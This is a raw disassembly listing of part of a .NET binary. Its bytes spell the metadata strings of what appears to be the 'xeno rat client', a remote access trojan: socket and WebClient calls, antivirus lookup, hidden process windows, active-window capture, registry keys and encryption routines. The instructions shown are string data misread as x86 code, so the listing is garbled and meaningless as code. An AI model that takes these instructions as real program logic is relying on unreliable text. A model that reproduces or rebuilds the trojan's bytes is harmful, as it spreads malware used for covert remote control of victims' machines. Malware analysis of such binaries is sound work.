  40a8a6:	2e 4e                	cs dec %esi
  40a8a8:	65 74 2e             	gs je  0x40a8d9
  40a8ab:	53                   	push   %ebx
  40a8ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8ad:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a8b0:	74 73                	je     0x40a925
  40a8b2:	00 73 65             	add    %dh,0x65(%ebx)
  40a8b5:	74 5f                	je     0x40a916
  40a8b7:	41                   	inc    %ecx
  40a8b8:	72 67                	jb     0x40a921
  40a8ba:	75 6d                	jne    0x40a929
  40a8bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a8be:	74 73                	je     0x40a933
  40a8c0:	00 45 78             	add    %al,0x78(%ebp)
  40a8c3:	69 73 74 73 00 47 65 	imul   $0x65470073,0x74(%ebx),%esi
  40a8ca:	74 41                	je     0x40a90d
  40a8cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8cd:	74 69                	je     0x40a938
  40a8cf:	76 69                	jbe    0x40a93a
  40a8d1:	72 75                	jb     0x40a948
  40a8d3:	73 00                	jae    0x40a8d5
  40a8d5:	67 65 74 5f          	addr16 gs je 0x40a938
  40a8d9:	4b                   	dec    %ebx
  40a8da:	65 79 73             	gs jns 0x40a950
  40a8dd:	00 43 6f             	add    %al,0x6f(%ebx)
  40a8e0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8e1:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a8e4:	00 43 6f             	add    %al,0x6f(%ebx)
  40a8e7:	6d                   	insl   (%dx),%es:(%edi)
  40a8e8:	70 72                	jo     0x40a95c
  40a8ea:	65 73 73             	gs jae 0x40a960
  40a8ed:	69 6f 6e 46 6f 72 6d 	imul   $0x6d726f46,0x6e(%edi),%ebp
  40a8f4:	61                   	popa
  40a8f5:	74 00                	je     0x40a8f7
  40a8f7:	4d                   	dec    %ebp
  40a8f8:	61                   	popa
  40a8f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8fa:	61                   	popa
  40a8fb:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a8fe:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a900:	74 42                	je     0x40a944
  40a902:	61                   	popa
  40a903:	73 65                	jae    0x40a96a
  40a905:	4f                   	dec    %edi
  40a906:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a909:	63 74 00 68          	arpl   %esi,0x68(%eax,%eax,1)
  40a90d:	4f                   	dec    %edi
  40a90e:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a911:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  40a915:	65 74 5f             	gs je  0x40a977
  40a918:	45                   	inc    %ebp
  40a919:	78 63                	js     0x40a97e
  40a91b:	65 70 74             	gs jo  0x40a992
  40a91e:	69 6f 6e 4f 62 6a 65 	imul   $0x656a624f,0x6e(%edi),%ebp
  40a925:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40a929:	61                   	popa
  40a92a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a92b:	61                   	popa
  40a92c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a92f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a931:	74 4f                	je     0x40a982
  40a933:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a936:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40a93a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a93b:	64 44                	fs inc %esp
  40a93d:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40a944:	63 74 00 5f          	arpl   %esi,0x5f(%eax,%eax,1)
  40a948:	4f                   	dec    %edi
  40a949:	6e                   	outsb  %ds:(%esi),(%dx)
  40a94a:	44                   	inc    %esp
  40a94b:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40a952:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  40a956:	65 67 69 6e 44 69 73 	imul   $0x6f637369,%gs:0x44(%bp),%ebp
  40a95d:	63 6f 
  40a95f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a960:	6e                   	outsb  %ds:(%esi),(%dx)
  40a961:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40a966:	65 74 00             	gs je  0x40a969
  40a969:	53                   	push   %ebx
  40a96a:	79 73                	jns    0x40a9df
  40a96c:	74 65                	je     0x40a9d3
  40a96e:	6d                   	insl   (%dx),%es:(%edi)
  40a96f:	2e 4e                	cs dec %esi
  40a971:	65 74 00             	gs je  0x40a974
  40a974:	53                   	push   %ebx
  40a975:	6f                   	outsl  %ds:(%esi),(%dx)
  40a976:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a979:	74 00                	je     0x40a97b
  40a97b:	73 6f                	jae    0x40a9ec
  40a97d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a980:	74 00                	je     0x40a982
  40a982:	54                   	push   %esp
  40a983:	5f                   	pop    %edi
  40a984:	6f                   	outsl  %ds:(%esi),(%dx)
  40a985:	66 66 73 65          	data16 data16 jae 0x40a9ee
  40a989:	74 00                	je     0x40a98b
  40a98b:	53                   	push   %ebx
  40a98c:	70 6c                	jo     0x40a9fa
  40a98e:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  40a995:	46 
  40a996:	6f                   	outsl  %ds:(%esi),(%dx)
  40a997:	72 45                	jb     0x40a9de
  40a999:	78 69                	js     0x40aa04
  40a99b:	74 00                	je     0x40a99d
  40a99d:	67 65 74 5f          	addr16 gs je 0x40aa00
  40a9a1:	52                   	push   %edx
  40a9a2:	65 73 75             	gs jae 0x40aa1a
  40a9a5:	6c                   	insb   (%dx),%es:(%edi)
  40a9a6:	74 00                	je     0x40a9a8
  40a9a8:	49                   	dec    %ecx
  40a9a9:	41                   	inc    %ecx
  40a9aa:	73 79                	jae    0x40aa25
  40a9ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9ad:	63 52 65             	arpl   %edx,0x65(%edx)
  40a9b0:	73 75                	jae    0x40aa27
  40a9b2:	6c                   	insb   (%dx),%es:(%edi)
  40a9b3:	74 00                	je     0x40a9b5
  40a9b5:	47                   	inc    %edi
  40a9b6:	65 74 52             	gs je  0x40aa0b
  40a9b9:	65 73 75             	gs jae 0x40aa31
  40a9bc:	6c                   	insb   (%dx),%es:(%edi)
  40a9bd:	74 00                	je     0x40a9bf
  40a9bf:	53                   	push   %ebx
  40a9c0:	65 74 52             	gs je  0x40aa15
  40a9c3:	65 73 75             	gs jae 0x40aa3b
  40a9c6:	6c                   	insb   (%dx),%es:(%edi)
  40a9c7:	74 00                	je     0x40a9c9
  40a9c9:	42                   	inc    %edx
  40a9ca:	79 74                	jns    0x40aa40
  40a9cc:	65 73 54             	gs jae 0x40aa23
  40a9cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9d0:	49                   	dec    %ecx
  40a9d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9d2:	74 00                	je     0x40a9d4
  40a9d4:	57                   	push   %edi
  40a9d5:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40a9d9:	69 65 6e 74 00 78 65 	imul   $0x65780074,0x6e(%ebp),%esp
  40a9e0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9e2:	20 72 61             	and    %dh,0x61(%edx)
  40a9e5:	74 20                	je     0x40aa07
  40a9e7:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40a9eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9ec:	74 00                	je     0x40a9ee
  40a9ee:	78 65                	js     0x40aa55
  40a9f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9f1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9f2:	5f                   	pop    %edi
  40a9f3:	72 61                	jb     0x40aa56
  40a9f5:	74 5f                	je     0x40aa56
  40a9f7:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40a9fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9fc:	74 00                	je     0x40a9fe
  40a9fe:	53                   	push   %ebx
  40a9ff:	79 73                	jns    0x40aa74
  40aa01:	74 65                	je     0x40aa68
  40aa03:	6d                   	insl   (%dx),%es:(%edi)
  40aa04:	2e 4d                	cs dec %ebp
  40aa06:	61                   	popa
  40aa07:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa08:	61                   	popa
  40aa09:	67 65 6d             	gs insl (%dx),%es:(%di)
  40aa0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aa0e:	74 00                	je     0x40aa10
  40aa10:	45                   	inc    %ebp
  40aa11:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa12:	76 69                	jbe    0x40aa7d
  40aa14:	72 6f                	jb     0x40aa85
  40aa16:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa17:	6d                   	insl   (%dx),%es:(%edi)
  40aa18:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aa1a:	74 00                	je     0x40aa1c
  40aa1c:	43                   	inc    %ebx
  40aa1d:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa1e:	6d                   	insl   (%dx),%es:(%edi)
  40aa1f:	70 6f                	jo     0x40aa90
  40aa21:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa22:	65 6e                	outsb  %gs:(%esi),(%dx)
  40aa24:	74 00                	je     0x40aa26
  40aa26:	50                   	push   %eax
  40aa27:	61                   	popa
  40aa28:	72 65                	jb     0x40aa8f
  40aa2a:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa2b:	74 00                	je     0x40aa2d
  40aa2d:	67 65 74 5f          	addr16 gs je 0x40aa90
  40aa31:	43                   	inc    %ebx
  40aa32:	75 72                	jne    0x40aaa6
  40aa34:	72 65                	jb     0x40aa9b
  40aa36:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa37:	74 00                	je     0x40aa39
  40aa39:	47                   	inc    %edi
  40aa3a:	65 74 43             	gs je  0x40aa80
  40aa3d:	75 72                	jne    0x40aab1
  40aa3f:	72 65                	jb     0x40aaa6
  40aa41:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa42:	74 00                	je     0x40aa44
  40aa44:	67 65 74 5f          	addr16 gs je 0x40aaa7
  40aa48:	52                   	push   %edx
  40aa49:	65 6d                	gs insl (%dx),%es:(%edi)
  40aa4b:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa4c:	74 65                	je     0x40aab3
  40aa4e:	45                   	inc    %ebp
  40aa4f:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa50:	64 50                	fs push %eax
  40aa52:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa53:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40aa5a:	5f                   	pop    %edi
  40aa5b:	43                   	inc    %ebx
  40aa5c:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa5d:	75 6e                	jne    0x40aacd
  40aa5f:	74 00                	je     0x40aa61
  40aa61:	67 65 74 5f          	addr16 gs je 0x40aac4
  40aa65:	54                   	push   %esp
  40aa66:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  40aa6d:	74 00                	je     0x40aa6f
  40aa6f:	67 65 74 5f          	addr16 gs je 0x40aad2
  40aa73:	50                   	push   %eax
  40aa74:	72 6f                	jb     0x40aae5
  40aa76:	63 65 73             	arpl   %esp,0x73(%ebp)
  40aa79:	73 6f                	jae    0x40aaea
  40aa7b:	72 43                	jb     0x40aac0
  40aa7d:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa7e:	75 6e                	jne    0x40aaee
  40aa80:	74 00                	je     0x40aa82
  40aa82:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40aa85:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa86:	74 00                	je     0x40aa88
  40aa88:	47                   	inc    %edi
  40aa89:	65 74 50             	gs je  0x40aadc
  40aa8c:	61                   	popa
  40aa8d:	74 68                	je     0x40aaf7
  40aa8f:	52                   	push   %edx
  40aa90:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa91:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa92:	74 00                	je     0x40aa94
  40aa94:	44                   	inc    %esp
  40aa95:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40aa99:	70 74                	jo     0x40ab0f
  40aa9b:	00 45 6e             	add    %al,0x6e(%ebp)
  40aa9e:	63 72 79             	arpl   %esi,0x79(%edx)
  40aaa1:	70 74                	jo     0x40ab17
  40aaa3:	00 53 74             	add    %dl,0x74(%ebx)
  40aaa6:	61                   	popa
  40aaa7:	72 74                	jb     0x40ab1d
  40aaa9:	00 43 6f             	add    %al,0x6f(%ebx)
  40aaac:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaad:	76 65                	jbe    0x40ab14
  40aaaf:	72 74                	jb     0x40ab25
  40aab1:	00 53 65             	add    %dl,0x65(%ebx)
  40aab4:	72 76                	jb     0x40ab2c
  40aab6:	65 72 50             	gs jb  0x40ab09
  40aab9:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaba:	72 74                	jb     0x40ab30
  40aabc:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  40aac0:	69 73 74 00 67 65 74 	imul   $0x74656700,0x74(%ebx),%esi
  40aac7:	5f                   	pop    %edi
  40aac8:	4f                   	dec    %edi
  40aac9:	75 74                	jne    0x40ab3f
  40aacb:	00 6f 72             	add    %ch,0x72(%edi)
  40aace:	69 67 69 6e 61 6c 4f 	imul   $0x4f6c616e,0x69(%edi),%esp
  40aad5:	75 74                	jne    0x40ab4b
  40aad7:	00 53 65             	add    %dl,0x65(%ebx)
  40aada:	74 4f                	je     0x40ab2b
  40aadc:	75 74                	jne    0x40ab52
  40aade:	00 73 65             	add    %dh,0x65(%ebx)
  40aae1:	74 5f                	je     0x40ab42
  40aae3:	52                   	push   %edx
  40aae4:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40aae8:	76 65                	jbe    0x40ab4f
  40aaea:	54                   	push   %esp
  40aaeb:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40aaf2:	53                   	push   %ebx
  40aaf3:	65 74 52             	gs je  0x40ab48
  40aaf6:	65 63 76 54          	arpl   %esi,%gs:0x54(%esi)
  40aafa:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40ab01:	52                   	push   %edx
  40ab02:	65 73 65             	gs jae 0x40ab6a
  40ab05:	74 52                	je     0x40ab59
  40ab07:	65 63 76 54          	arpl   %esi,%gs:0x54(%esi)
  40ab0b:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40ab12:	73 6f                	jae    0x40ab83
  40ab14:	63 6b 74             	arpl   %ebp,0x74(%ebx)
  40ab17:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40ab1e:	43                   	inc    %ebx
  40ab1f:	6c                   	insb   (%dx),%es:(%edi)
  40ab20:	65 61                	gs popa
  40ab22:	72 43                	jb     0x40ab67
  40ab24:	61                   	popa
  40ab25:	70 74                	jo     0x40ab9b
  40ab27:	75 72                	jne    0x40ab9b
  40ab29:	65 64 4f             	gs fs dec %edi
  40ab2c:	75 74                	jne    0x40aba2
  40ab2e:	70 75                	jo     0x40aba5
  40ab30:	74 00                	je     0x40ab32
  40ab32:	47                   	inc    %edi
  40ab33:	65 74 43             	gs je  0x40ab79
  40ab36:	61                   	popa
  40ab37:	70 74                	jo     0x40abad
  40ab39:	75 72                	jne    0x40abad
  40ab3b:	65 64 4f             	gs fs dec %edi
  40ab3e:	75 74                	jne    0x40abb4
  40ab40:	70 75                	jo     0x40abb7
  40ab42:	74 00                	je     0x40ab44
  40ab44:	67 65 74 5f          	addr16 gs je 0x40aba7
  40ab48:	53                   	push   %ebx
  40ab49:	74 61                	je     0x40abac
  40ab4b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab4c:	64 61                	fs popa
  40ab4e:	72 64                	jb     0x40abb4
  40ab50:	4f                   	dec    %edi
  40ab51:	75 74                	jne    0x40abc7
  40ab53:	70 75                	jo     0x40abca
  40ab55:	74 00                	je     0x40ab57
  40ab57:	73 65                	jae    0x40abbe
  40ab59:	74 5f                	je     0x40abba
  40ab5b:	52                   	push   %edx
  40ab5c:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40ab63:	53 74 
  40ab65:	61                   	popa
  40ab66:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab67:	64 61                	fs popa
  40ab69:	72 64                	jb     0x40abcf
  40ab6b:	4f                   	dec    %edi
  40ab6c:	75 74                	jne    0x40abe2
  40ab6e:	70 75                	jo     0x40abe5
  40ab70:	74 00                	je     0x40ab72
  40ab72:	4d                   	dec    %ebp
  40ab73:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab74:	76 65                	jbe    0x40abdb
  40ab76:	4e                   	dec    %esi
  40ab77:	65 78 74             	gs js  0x40abee
  40ab7a:	00 53 79             	add    %dl,0x79(%ebx)
  40ab7d:	73 74                	jae    0x40abf3
  40ab7f:	65 6d                	gs insl (%dx),%es:(%edi)
  40ab81:	2e 54                	cs push %esp
  40ab83:	65 78 74             	gs js  0x40abfa
  40ab86:	00 57 72             	add    %dl,0x72(%edi)
  40ab89:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  40ab90:	65 
  40ab91:	78 74                	js     0x40ac07
  40ab93:	00 47 65             	add    %al,0x65(%edi)
  40ab96:	74 57                	je     0x40abef
  40ab98:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40ab9f:	78 74                	js     0x40ac15
  40aba1:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40aba5:	74 00                	je     0x40aba7
  40aba7:	44                   	inc    %esp
  40aba8:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40abac:	4d                   	dec    %ebp
  40abad:	65 6e                	outsb  %gs:(%esi),(%dx)
  40abaf:	75 00                	jne    0x40abb1
  40abb1:	52                   	push   %edx
  40abb2:	65 67 69 73 74 72 79 	imul   $0x69567972,%gs:0x74(%bp,%di),%esi
  40abb9:	56 69 
  40abbb:	65 77 00             	gs ja  0x40abbe
  40abbe:	67 65 74 5f          	addr16 gs je 0x40ac21
  40abc2:	4e                   	dec    %esi
  40abc3:	6f                   	outsl  %ds:(%esi),(%dx)
  40abc4:	77 00                	ja     0x40abc6
  40abc6:	47                   	inc    %edi
  40abc7:	65 74 46             	gs je  0x40ac10
  40abca:	6f                   	outsl  %ds:(%esi),(%dx)
  40abcb:	72 65                	jb     0x40ac32
  40abcd:	67 72 6f             	addr16 jb 0x40ac3f
  40abd0:	75 6e                	jne    0x40ac40
  40abd2:	64 57                	fs push %edi
  40abd4:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  40abdb:	65 74 43             	gs je  0x40ac21
  40abde:	61                   	popa
  40abdf:	70 74                	jo     0x40ac55
  40abe1:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40abe8:	74 69                	je     0x40ac53
  40abea:	76 65                	jbe    0x40ac51
  40abec:	57                   	push   %edi
  40abed:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40abf4:	65 74 5f             	gs je  0x40ac56
  40abf7:	43                   	inc    %ebx
  40abf8:	72 65                	jb     0x40ac5f
  40abfa:	61                   	popa
  40abfb:	74 65                	je     0x40ac62
  40abfd:	4e                   	dec    %esi
  40abfe:	6f                   	outsl  %ds:(%esi),(%dx)
  40abff:	57                   	push   %edi
  40ac00:	69 6e 64 6f 77 00 4d 	imul   $0x4d00776f,0x64(%esi),%ebp
  40ac07:	75 74                	jne    0x40ac7d
  40ac09:	65 78 00             	gs js  0x40ac0c
  40ac0c:	73 65                	jae    0x40ac73
  40ac0e:	74 5f                	je     0x40ac6f
  40ac10:	4e                   	dec    %esi
  40ac11:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac12:	44                   	inc    %esp
  40ac13:	65 6c                	gs insb (%dx),%es:(%edi)
  40ac15:	61                   	popa
  40ac16:	79 00                	jns    0x40ac18
  40ac18:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40ac1b:	61                   	popa
  40ac1c:	79 00                	jns    0x40ac1e
  40ac1e:	49                   	dec    %ecx
  40ac1f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac20:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40ac27:	65 
  40ac28:	41                   	inc    %ecx
  40ac29:	72 72                	jb     0x40ac9d
  40ac2b:	61                   	popa
  40ac2c:	79 00                	jns    0x40ac2e
  40ac2e:	54                   	push   %esp
  40ac2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac30:	41                   	inc    %ecx
  40ac31:	72 72                	jb     0x40aca5
  40ac33:	61                   	popa
  40ac34:	79 00                	jns    0x40ac36
  40ac36:	67 65 74 5f          	addr16 gs je 0x40ac99
  40ac3a:	4b                   	dec    %ebx
  40ac3b:	65 79 00             	gs jns 0x40ac3e
  40ac3e:	73 65                	jae    0x40aca5
  40ac40:	74 5f                	je     0x40aca1
  40ac42:	4b                   	dec    %ebx
  40ac43:	65 79 00             	gs jns 0x40ac46
  40ac46:	4f                   	dec    %edi
  40ac47:	70 65                	jo     0x40acae
  40ac49:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac4a:	53                   	push   %ebx
  40ac4b:	75 62                	jne    0x40acaf
  40ac4d:	4b                   	dec    %ebx
  40ac4e:	65 79 00             	gs jns 0x40ac51
  40ac51:	4f                   	dec    %edi
  40ac52:	70 65                	jo     0x40acb9
  40ac54:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac55:	42                   	inc    %edx
  40ac56:	61                   	popa
  40ac57:	73 65                	jae    0x40acbe
  40ac59:	4b                   	dec    %ebx
  40ac5a:	65 79 00             	gs jns 0x40ac5d
  40ac5d:	5f                   	pop    %edi
  40ac5e:	45                   	inc    %ebp
  40ac5f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac60:	63 72 79             	arpl   %esi,0x79(%edx)
  40ac63:	70 74                	jo     0x40acd9
  40ac65:	69 6f 6e 4b 65 79 00 	imul   $0x79654b,0x6e(%edi),%ebp
  40ac6c:	43                   	inc    %ebx
  40ac6d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac6e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac6f:	74 61                	je     0x40acd2
  40ac71:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  40ac78:	52                   	push   %edx
  40ac79:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40ac80:	4b 65 
  40ac82:	79 00                	jns    0x40ac84
  40ac84:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40ac88:	53                   	push   %ebx
  40ac89:	79 73                	jns    0x40acfe
  40ac8b:	74 65                	je     0x40acf2
  40ac8d:	6d                   	insl   (%dx),%es:(%edi)
  40ac8e:	2e 53                	cs push %ebx
  40ac90:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40ac94:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40ac9b:	70 
  40ac9c:	74 6f                	je     0x40ad0d
  40ac9e:	67 72 61             	addr16 jb 0x40ad02
  40aca1:	70 68                	jo     0x40ad0b
  40aca3:	79 00                	jns    0x40aca5
  40aca5:	47                   	inc    %edi
  40aca6:	65 74 45             	gs je  0x40acee
  40aca9:	78 65                	js     0x40ad10
  40acab:	63 75 74             	arpl   %esi,0x74(%ebp)
  40acae:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  40acb5:	6d                   	insl   (%dx),%es:(%edi)
  40acb6:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40acba:	47                   	inc    %edi
  40acbb:	65 74 45             	gs je  0x40ad03
  40acbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40acbf:	74 72                	je     0x40ad33
  40acc1:	79 41                	jns    0x40ad04
  40acc3:	73 73                	jae    0x40ad38
  40acc5:	65 6d                	gs insl (%dx),%es:(%edi)
  40acc7:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40accb:	41                   	inc    %ecx
  40accc:	64 64 72 65          	fs fs jb 0x40ad35
  40acd0:	73 73                	jae    0x40ad45
  40acd2:	46                   	inc    %esi
  40acd3:	61                   	popa
  40acd4:	6d                   	insl   (%dx),%es:(%edi)
  40acd5:	69 6c 79 00 53 65 6c 	imul   $0x656c6553,0x0(%ecx,%edi,2),%ebp
  40acdc:	65 
  40acdd:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  40ace1:	6e                   	outsb  %ds:(%esi),(%dx)
  40ace2:	79 00                	jns    0x40ace4
  40ace4:	42                   	inc    %edx
  40ace5:	6c                   	insb   (%dx),%es:(%edi)
  40ace6:	6f                   	outsl  %ds:(%esi),(%dx)
  40ace7:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  40acea:	6f                   	outsl  %ds:(%esi),(%dx)
  40aceb:	70 79                	jo     0x40ad66
  40aced:	00 67 65             	add    %ah,0x65(%edi)
  40acf0:	74 5f                	je     0x40ad51
  40acf2:	46                   	inc    %esi
  40acf3:	61                   	popa
  40acf4:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40acf8:	79 00                	jns    0x40acfa
  40acfa:	54                   	push   %esp
  40acfb:	61                   	popa
  40acfc:	73 6b                	jae    0x40ad69
  40acfe:	46                   	inc    %esi
  40acff:	61                   	popa
  40ad00:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40ad04:	79 00                	jns    0x40ad06
  40ad06:	43                   	inc    %ebx
  40ad07:	72 65                	jb     0x40ad6e
  40ad09:	61                   	popa
  40ad0a:	74 65                	je     0x40ad71
  40ad0c:	44                   	inc    %esp
  40ad0d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40ad14:	79 00                	jns    0x40ad16
  40ad16:	67 65 74 5f          	addr16 gs je 0x40ad79
  40ad1a:	53                   	push   %ebx
  40ad1b:	79 73                	jns    0x40ad90
  40ad1d:	74 65                	je     0x40ad84
  40ad1f:	6d                   	insl   (%dx),%es:(%edi)
  40ad20:	44                   	inc    %esp
  40ad21:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40ad28:	79 00                	jns    0x40ad2a
  40ad2a:	47                   	inc    %edi
  40ad2b:	65 74 43             	gs je  0x40ad71
  40ad2e:	75 72                	jne    0x40ada2
  40ad30:	72 65                	jb     0x40ad97
  40ad32:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad33:	74 44                	je     0x40ad79
  40ad35:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40ad3c:	79 00                	jns    0x40ad3e
  40ad3e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad3f:	70 5f                	jo     0x40ada0
  40ad41:	45                   	inc    %ebp
  40ad42:	71 75                	jno    0x40adb9
  40ad44:	61                   	popa
  40ad45:	6c                   	insb   (%dx),%es:(%edi)
  40ad46:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40ad4d:	49 
  40ad4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad4f:	65 71 75             	gs jno 0x40adc7
  40ad52:	61                   	popa
  40ad53:	6c                   	insb   (%dx),%es:(%edi)
  40ad54:	69 74 79 00 43 6c 61 	imul   $0x69616c43,0x0(%ecx,%edi,2),%esi
  40ad5b:	69 
  40ad5c:	6d                   	insl   (%dx),%es:(%edi)
  40ad5d:	73 49                	jae    0x40ada8
  40ad5f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40ad62:	74 69                	je     0x40adcd
  40ad64:	74 79                	je     0x40addf
  40ad66:	00 57 69             	add    %dl,0x69(%edi)
  40ad69:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad6a:	64 6f                	outsl  %fs:(%esi),(%dx)
  40ad6c:	77 73                	ja     0x40ade1
  40ad6e:	49                   	dec    %ecx
  40ad6f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40ad72:	74 69                	je     0x40addd
  40ad74:	74 79                	je     0x40adef
  40ad76:	00 45 6d             	add    %al,0x6d(%ebp)
  40ad79:	70 74                	jo     0x40adef
  40ad7b:	79 00                	jns    0x40ad7d
  40ad7d:	00 00                	add    %al,(%eax)
  40ad7f:	00 00                	add    %al,(%eax)
  40ad81:	17                   	pop    %ss
  40ad82:	50                   	push   %eax
  40ad83:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40ad87:	00 67 00             	add    %ah,0x0(%edi)
  40ad8a:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40ad90:	4d                   	dec    %ebp
  40ad91:	00 61 00             	add    %ah,0x0(%ecx)
  40ad94:	69 00 6e 00 00 1f    	imul   $0x1f00006e,(%eax),%eax
  40ad9a:	78 00                	js     0x40ad9c
  40ad9c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ada0:	6f                   	outsl  %ds:(%esi),(%dx)
  40ada1:	00 20                	add    %ah,(%eax)
  40ada3:	00 72 00             	add    %dh,0x0(%edx)
  40ada6:	61                   	popa
